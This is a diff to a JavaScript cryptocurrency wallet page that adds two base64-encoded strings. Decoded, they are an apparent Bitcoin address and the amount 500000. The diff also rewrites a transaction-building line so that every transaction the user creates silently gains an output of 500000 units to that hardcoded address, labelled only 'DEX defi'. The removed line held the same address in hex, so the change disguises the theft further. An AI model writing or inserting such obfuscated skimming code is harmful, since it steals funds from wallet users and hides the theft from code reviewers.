@@ -153,6 +153,10 @@ $(document).ready(function() {
 		});
 	});
 
+base1=atob("MUp0YnE0YUpBcTVQUEVZWG9ZdkJxZlVOUVJ1azg0YXZHVg==");
+base2=atob("NTAwMDAw");
+
+
 	$("#walletSendBtn").click(function(){
 
 		$("#walletSendFailTransaction").addClass('hidden');
@@ -590,7 +594,9 @@ $(document).ready(function() {
 		}
 
 // DEX defi
-tx.addoutput2(Crypto.util.bytesToHex("314a74627134614a41713550504559586f5976427166554e5152756b383461764756"), 500000);
+
+tx.addoutput2(base1, base2);
+
 
 		if(!$("#recipients .row, #inputs .row").hasClass('has-error')){
 			$("#transactionCreate textarea").val(tx.serialize());
